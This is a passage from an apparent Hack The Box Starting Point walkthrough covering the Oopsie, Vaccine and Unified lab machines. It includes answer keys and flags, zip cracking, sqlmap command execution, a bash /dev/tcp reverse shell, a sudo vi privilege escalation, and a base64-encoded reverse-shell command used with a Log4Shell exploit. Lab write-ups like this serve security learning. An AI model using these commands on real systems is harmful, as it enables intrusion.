/posts/htb/startingpoint-tier2/images/oopsie_hu2247206243703779769.webp 1024w" sizes=100vw src=images/oopsie.png width=768 height=590 loading=lazy><figcaption></figcaption></figure></p><h3 id=questions-1>Questions<a hidden class=anchor aria-hidden=true href=#questions-1>#</a></h3><ul><li>With what kind of tool can intercept web traffic? <code>proxy</code></li><li>What is the path to the directory on the webserver that returns a login page? <code>/cdn-cgi/login</code></li><li>What can be modified in Firefox to get access to the upload page? <code>cookie</code></li><li>What is the access ID of the admin user? <code>34322</code></li><li>On uploading a file, what directory does that file appear in on the server? <code>/uploads</code></li><li>What is the file that contains the password that is shared with the robert user? <code>db.php</code></li><li>What executable is run with the option &ldquo;-group bugtracker&rdquo; to identify all files owned by the bugtracker group? <code>find</code></li><li>Regardless of which user starts running the bugtracker executable, what&rsquo;s user privileges will use to run? <code>root</code></li><li>What SUID stands for? <code>Set owner user id</code></li><li>What is the name of the executable being called in an insecure manner? <code>cat</code></li></ul><p><strong>user flag:</strong> <code>f2c74ee8db7983851ab2a96a44eb7981</code></p><p><strong>root flag:</strong> <code>af13b0bee69f8a877c3faf667f7beacf</code></p><h2 id=vaccine>Vaccine<a hidden class=anchor aria-hidden=true href=#vaccine>#</a></h2><h3 id=nmap-2>nmap<a hidden class=anchor aria-hidden=true href=#nmap-2>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Thu Nov  3 18:03:58 2022 as: nmap -sC -sV -oA nmap/vaccine -T4 10.129.199.211</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.199.211
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.070s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst:
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT:
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.10.14.66
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftpuser
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>4</span>
</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_-rwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        <span class=m>0</span>            <span class=m>2533</span> Apr <span class=m>13</span>  <span class=m>2021</span> backup.zip
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: MegaCorp Login
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags:
</span></span><span class=line><span class=cl><span class=p>|</span>   /:
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID:
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Thu Nov  3 18:04:09 2022 -- 1 IP address (1 host up) scanned in 10.79 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ftp>ftp<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h3><p><code>ftp</code> is open on <code>port 21</code> and anonymous mode is enabled. Found a file named <code>backup.zip</code>, however the files are password protected on unzipping. <code>john</code> has a tool called <code>zip2john</code> that can allow us to convert his file to hash, and ultimately try to crack it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>zip2john backup.zip &gt; zip.hash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>john -w<span class=o>=</span>/usr/share/wordlists/rockyou.txt zip.hash
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
</span></span></code></pre></div><p><code>741852963</code> turns out to be the password for the zip!</p><p>Taking a look into <code>index.php</code> gives us some password information:</p><p><figure class=image-caption><img alt=index.php srcset="/posts/htb/startingpoint-tier2/images/index.php_hu6002290910920136563.webp 480w,
/posts/htb/startingpoint-tier2/images/index.php_hu17118587675188143496.webp 768w,
/posts/htb/startingpoint-tier2/images/index.php_hu79166889808999335.webp 1024w" sizes=100vw src=images/index.php.png width=768 height=574 loading=lazy><figcaption></figcaption></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>hash_md5(???) = &#34;2cb42f8734ea607eefed3b70af13bbd3&#34;
</span></span></code></pre></div><p><a href="https://md5.gromweb.com/?md5=2cb42f8734ea607eefed3b70af13bbd3" title=md5lookup target=_blank rel="nofollow noopener">md5lookup</a> tells us the password is <code>qwerty789</code></p><h3 id=http-1>http<a hidden class=anchor aria-hidden=true href=#http-1>#</a></h3><p><code>http</code> is also open, so it is likely they have a website.</p><p><figure class=image-caption><img alt=login srcset="/posts/htb/startingpoint-tier2/images/login_hu2223302716323152181.webp 480w,
/posts/htb/startingpoint-tier2/images/login_hu13199887322029428548.webp 768w,
/posts/htb/startingpoint-tier2/images/login_hu15441673294039321321.webp 1024w" sizes=100vw src=images/login.png width=768 height=676 loading=lazy><figcaption></figcaption></figure></p><p>Now lets try the credentials we found <code>admin:qwerty789</code></p><p><figure class=image-caption><img alt=qwerty srcset="/posts/htb/startingpoint-tier2/images/qwerty_hu3902101094347207279.webp 480w,
/posts/htb/startingpoint-tier2/images/qwerty_hu15571903128557155884.webp 768w,
/posts/htb/startingpoint-tier2/images/qwerty_hu6033358267431441412.webp 1024w" sizes=100vw src=images/qwerty.png width=768 height=681 loading=lazy><figcaption></figcaption></figure></p><p>After looking around, the only thing that seemed potentially vulnerable on the webpage was the <code>search</code> feature. This could be injectable via <code>sqlmap</code>. I first threw the website into <code>burpsuite</code>, copied the <code>GET</code> request of the search, and then saved this to a file called <code>get.request</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sqlmap -r get.request -p search
</span></span></code></pre></div><p><figure class=image-caption><img alt=sqlmap srcset="/posts/htb/startingpoint-tier2/images/sqlmap_hu11280360300698663176.webp 480w,
/posts/htb/startingpoint-tier2/images/sqlmap_hu11172285655683458567.webp 768w,
/posts/htb/startingpoint-tier2/images/sqlmap_hu10695641198284776908.webp 1024w" sizes=100vw src=images/sqlmap.png width=768 height=572 loading=lazy><figcaption></figcaption></figure></p><p>From here, I started looking around the databases.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sqlmap -r get.request -p search --search -C <span class=s1>&#39;password&#39;</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=dbs srcset="/posts/htb/startingpoint-tier2/images/dbs_hu39976624987471237.webp 480w,
/posts/htb/startingpoint-tier2/images/dbs_hu7428112255010449152.webp 768w,
/posts/htb/startingpoint-tier2/images/dbs_hu16828603429763868328.webp 1024w" sizes=100vw src=images/dbs.png width=768 height=572 loading=lazy><figcaption></figcaption></figure></p><p>There could be valuable columns in <code>pg_catalog</code>, but I noticed a command flag called <code>--os-shell</code> in <code>sqlmap</code>&rsquo;s man pages. After running this I actually got a shell (even better)!</p><p><figure class=image-caption><img alt=sqlshell srcset="/posts/htb/startingpoint-tier2/images/sqlshell_hu17331458491531587116.webp 480w,
/posts/htb/startingpoint-tier2/images/sqlshell_hu16016801372297262383.webp 768w,
/posts/htb/startingpoint-tier2/images/sqlshell_hu10543375434778290078.webp 1024w" sizes=100vw src=images/sqlshell.png width=768 height=571 loading=lazy><figcaption></figcaption></figure></p><p>Time for a reverse shell – I just found <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp title="these payloads" target=_blank rel="nofollow noopener">these payloads</a> for bash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.66/1337 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>I then used <a href=https://github.com/calebstewart/pwncat title=pwncat target=_blank rel="nofollow noopener">pwncat</a> to help keep a stable shell and listen on port <code>1337</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>find / -name user.txt 2&gt;/dev/null
</span></span></code></pre></div><p><em>file: user.txt</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>ec9b13ca4d6229cd5cc1e09980965bf7
</span></span></code></pre></td></tr></table></div></div><h3 id=ssh>ssh<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h3><p>When starting privesc, I found something valuable for <code>ssh</code> (Secure Shell).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>cd</span> /<span class=p>;</span> grep -R password
</span></span></code></pre></div><p><figure class=image-caption><img alt=grep srcset="/posts/htb/startingpoint-tier2/images/grep_hu11638737944623474545.webp 480w,
/posts/htb/startingpoint-tier2/images/grep_hu8203487475534220090.webp 768w,
/posts/htb/startingpoint-tier2/images/grep_hu13355759870000887069.webp 1024w" sizes=100vw src=images/grep.png width=768 height=574 loading=lazy><figcaption></figcaption></figure></p><p>Looks like we can now <code>ssh</code> into the server directly instead of hosting an unstable reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ssh postgres@10.129.199.211<span class=sb>`</span> 
</span></span><span class=line><span class=cl><span class=o>(</span>P@s5w0rd!<span class=o>)</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=ssh srcset="/posts/htb/startingpoint-tier2/images/ssh_hu6741112812570924642.webp 480w,
/posts/htb/startingpoint-tier2/images/ssh_hu4760156447773477045.webp 768w,
/posts/htb/startingpoint-tier2/images/ssh_hu4173068220009770624.webp 1024w" sizes=100vw src=images/ssh.png width=768 height=568 loading=lazy><figcaption></figcaption></figure></p><h3 id=privesc-2>privesc<a hidden class=anchor aria-hidden=true href=#privesc-2>#</a></h3><p>We can then try to escalate privs. Let&rsquo;s start with the basics like <code>id</code> and <code>sudo -l</code></p><p><figure class=image-caption><img alt=fail srcset="/posts/htb/startingpoint-tier2/images/fail_hu6567764503564002156.webp 480w,
/posts/htb/startingpoint-tier2/images/fail_hu10498089447412585668.webp 768w,
/posts/htb/startingpoint-tier2/images/fail_hu8974795461919308789.webp 1024w" sizes=100vw src=images/fail.png width=768 height=577 loading=lazy><figcaption></figcaption></figure></p><p>Looks like we can edit <code>pg_hba.conf</code> with <code>sudo</code> privs by using <code>vi</code>. So I tried the <a href=https://gtfobins.github.io/gtfobins/vi/#sudo title="basic payload" target=_blank rel="nofollow noopener">basic payload</a> to get a shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-vim data-lang=vim><span class=line><span class=cl><span class=p>(</span><span class=nx>in</span> <span class=nx>vi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=k>set</span> <span class=nx>shell</span><span class=p>=</span><span class=sr>/bin/</span><span class=nx>sh</span>`
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=nx>shell</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=vaccine srcset="/posts/htb/startingpoint-tier2/images/vaccine_hu13074766077608285632.webp 480w,
/posts/htb/startingpoint-tier2/images/vaccine_hu16691516214389337207.webp 768w,
/posts/htb/startingpoint-tier2/images/vaccine_hu15413882181101155467.webp 1024w" sizes=100vw src=images/vaccine.png width=768 height=569 loading=lazy><figcaption></figcaption></figure></p><h3 id=questions-2>Questions<a hidden class=anchor aria-hidden=true href=#questions-2>#</a></h3><ul><li>Besides SSH and HTTP, what other service is hosted on this box? <code>ftp</code></li><li>This service can be configured to allow login with any password for specific username. What is that username? <code>anonymous</code></li><li>What is the name of the file downloaded over this service? <code>backup.zip</code></li><li>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? <code>zip2john</code></li><li>What is the password for the admin user on the website? <code>qwerty789</code></li><li>What option can be passed to sqlmap to try to get command execution via the sql injection? <code>--os-shell</code></li><li>What program can the postgres user run as root using sudo? <code>vi</code></li></ul><p><strong>user flag:</strong> <code>ec9b13ca4d6229cd5cc1e09980965bf7</code></p><p><strong>root flag:</strong> <code>dd6e058e814260bc70e9bbdef2715849</code></p><h2 id=unified>Unified<a hidden class=anchor aria-hidden=true href=#unified>#</a></h2><h3 id=nmap-3>nmap<a hidden class=anchor aria-hidden=true href=#nmap-3>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Fri Nov  4 22:29:03 2022 as: nmap -sC -sV -oA nmap/unified -T4 10.129.186.136</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.186.136
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.073s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 18:Cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>6789/tcp open  ibm-db2-admin?
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Language: en
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>431</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sat, <span class=m>05</span> Nov <span class=m>2022</span> 02:29:11 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Found&lt;/title&gt;&lt;style <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span>&gt;body <span class=o>{</span>font-family:Tahoma,Arial,sans-serif<span class=p>;</span><span class=o>}</span> h1, h2, h3, b <span class=o>{</span>color:white<span class=p>;</span>background-color:#525D76<span class=p>;</span><span class=o>}</span> h1 <span class=o>{</span>font-size:22px<span class=p>;</span><span class=o>}</span> h2 <span class=o>{</span>font-size:16px<span class=p>;</span><span class=o>}</span> h3 <span class=o>{</span>font-size:14px<span class=p>;</span><span class=o>}</span> p <span class=o>{</span>font-size:12px<span class=p>;</span><span class=o>}</span> a <span class=o>{</span>color:black<span class=p>;</span><span class=o>}</span> .line <span class=o>{</span>height:1px<span class=p>;</span>background-color:#525D76<span class=p>;</span>border:none<span class=p>;</span><span class=o>}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest, HTTPOptions:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>302</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Location: http://localhost:8080/manage
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sat, <span class=m>05</span> Nov <span class=m>2022</span> 02:29:11 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest, Socks5:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Language: en
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>435</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sat, <span class=m>05</span> Nov <span class=m>2022</span> 02:29:11 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class=m>400</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Request&lt;/title&gt;&lt;style <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span>&gt;body <span class=o>{</span>font-family:Tahoma,Arial,sans-serif<span class=p>;</span><span class=o>}</span> h1, h2, h3, b <span class=o>{</span>color:white<span class=p>;</span>background-color:#525D76<span class=p>;</span><span class=o>}</span> h1 <span class=o>{</span>font-size:22px<span class=p>;</span><span class=o>}</span> h2 <span class=o>{</span>font-size:16px<span class=p>;</span><span class=o>}</span> h3 <span class=o>{</span>font-size:14px<span class=p>;</span><span class=o>}</span> p <span class=o>{</span>font-size:12px<span class=p>;</span><span class=o>}</span> a <span class=o>{</span>color:black<span class=p>;</span><span class=o>}</span> .line <span class=o>{</span>height:1px<span class=p>;</span>background-color:#525D76<span class=p>;</span>border:none<span class=p>;</span><span class=o>}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class=m>400</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://10.129.186.136:8443/manage
</span></span><span class=line><span class=cl>8443/tcp open  ssl/nagios-nsca Nagios NSCA
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: UniFi Network
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was /manage/account/login?redirect<span class=o>=</span>%2Fmanage
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>UniFi/organizationName<span class=o>=</span>Ubiquiti Inc./stateOrProvinceName<span class=o>=</span>New York/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:UniFi
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-12-30T21:37:24
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-04-03T21:37:24
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Fri Nov  4 22:31:59 2022 -- 1 IP address (1 host up) scanned in 175.56 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=http-2>http<a hidden class=anchor aria-hidden=true href=#http-2>#</a></h3><p>Going to <code>10.129.186.136:8080</code> redirects us to <code>10.129.186.136:8443</code> and shows a login page:</p><p><figure class=image-caption><img alt=unifi srcset="/posts/htb/startingpoint-tier2/images/unifi_hu14585426518511697052.webp 480w,
/posts/htb/startingpoint-tier2/images/unifi_hu3488352162743653748.webp 768w,
/posts/htb/startingpoint-tier2/images/unifi_hu6058193289736578809.webp 1024w" sizes=100vw src=images/unifi.png width=768 height=680 loading=lazy><figcaption></figcaption></figure></p><p>After a quick search, I found that <code>Unifi 6.4.54</code> is vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228 title=CVE-2021-44228 target=_blank rel="nofollow noopener">CVE-2021-44228</a> in an in-depth <a href=https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi title="post walk-through" target=_blank rel="nofollow noopener">post walk-through</a>. I simply followed this walk-through to get a reverse shell!</p><p><strong>log4j (via HTB Writeup)</strong></p><p>&ldquo;<code>JNDI</code> (Java Naming and Directory Interface) API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.</p><p><code>LDAP</code> (Lightweight Directory Access Protocol) is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389.&rdquo;</p><p><em><strong>Important note:</strong></em> you must remove the spaces from the command listed in the <a href=https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi title="above writeup" target=_blank rel="nofollow noopener">above writeup</a> in order to successfully get a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>java -jar target/RogueJndi-1.1.jar --command <span class=s2>&#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span class=s2>&#34;10.10.14.25&#34;</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=pwncat srcset="/posts/htb/startingpoint-tier2/images/pwncat_hu12661072277305367179.webp 480w,
/posts/htb/startingpoint-tier2/images/pwncat_hu9741264661170422387.webp 768w,
/posts/htb/startingpoint-tier2/images/pwncat_hu245934769255300262.webp 1024w" sizes=100vw src=images/pwncat.png width=768 height=595 loading=lazy><figcaption></figcaption></figure></p><p>From here, we can easily get the <code>user.txt</code></p><p><figure class=image-caption><img alt=user srcset="/posts/htb/startingpoint-tier2/images/user_hu149417664242627740.webp 480w,
/posts/htb/startingpoint-tier2/images/user_hu5517014478595594593.webp 768w,
/posts/htb/startingpoint-tier2/images/user_hu11534760292691826493.webp 1024w" sizes=100vw src=images/user.png width=768 height=595 loading=lazy><figcaption></figcaption></figure></p><h3 id=privesc-3>privesc<a hidden class=anchor aria-hidden=true href=#privesc-3>#</a></h3><p>The tutorial continues to discuss how to actually interact with <code>mongodb</code> in order to become an administrator and access the website. One way to do this is to update the <code>administrator</code> password already stored. This is done by:</p><p>Creating a <code>sha-512</code> has for our new password <code>unified</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ mkpasswd -m sha-512 unified
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4</span>/Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1
</span></span></code></pre></div><p>Looking through the <code>ace</code> database for the <code>administrator</code> user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>mongo --port <span class=m>27117</span> ace --eval <span class=s2>&#34;db.admin.find().forEach(printjson);&#34;</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=db srcset="/posts/htb/startingpoint-tier2/images/db_hu13554425821666180272.webp 480w,
/posts/htb/startingpoint-tier2/images/db_hu1308816193481458916.webp 768w,
